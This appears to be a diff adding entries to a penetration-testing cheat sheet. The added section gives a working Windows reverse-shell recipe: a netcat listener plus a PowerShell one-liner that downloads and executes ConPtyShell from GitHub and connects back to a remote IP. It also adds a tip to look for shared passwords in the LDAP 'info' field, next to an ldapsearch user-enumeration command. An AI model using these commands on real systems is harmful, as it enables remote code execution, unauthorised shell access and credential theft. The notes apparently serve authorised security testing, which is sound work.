@@ -81,8 +81,27 @@
         tag fetch 1 (BODY[1])
         tag fetch 2:5 BODY[HEADER] BODY[1]
     ```
-      
-# Upgrade shell to interactive
+
+# Interactive shell for Windows!
+- https://github.com/antonioCoco/ConPtyShell
+## From Webshell 
+It's important to have the same rows and cols size between your terminal and the remote terminal if you want to have an aligned output on the shell.
+
+#### Method 1
+In this method the terminal size is set without you pass the rows and cols parameters to Invoke-ConPtyShell function:
+
+##### Server Side:
+```
+stty raw -echo; (stty size; cat) | nc -lvnp 3001
+```
+
+##### Client Side:
+
+```
+IEX(IWR https://raw.githubusercontent.com/antonioCoco/ConPtyShell/master/Invoke-ConPtyShell.ps1 -UseBasicParsing); Invoke-ConPtyShell 10.0.0.2 3001
+```
+
+## Upgrade shell to interactive
 - https://blog.ropnop.com/upgrading-simple-shells-to-fully-interactive-ttys/
 - TDLR: 
   ```
@@ -112,6 +131,8 @@
 # LDAP
 1. LDAPsearch (kali)
 - ``` ldapsearch -h {host} -x -b "DC=??,DC=local" '(objectClass=User) samaccountname | grep samaccountname | awk '{print $2}' ``` Get user list | remember remove obviously not using account e.g. Guest, system account
+## Interesting Thing
+- Look for 'info' field (some people will lazy put shared password there)
 
 # Php
 ## PHP Wrappers
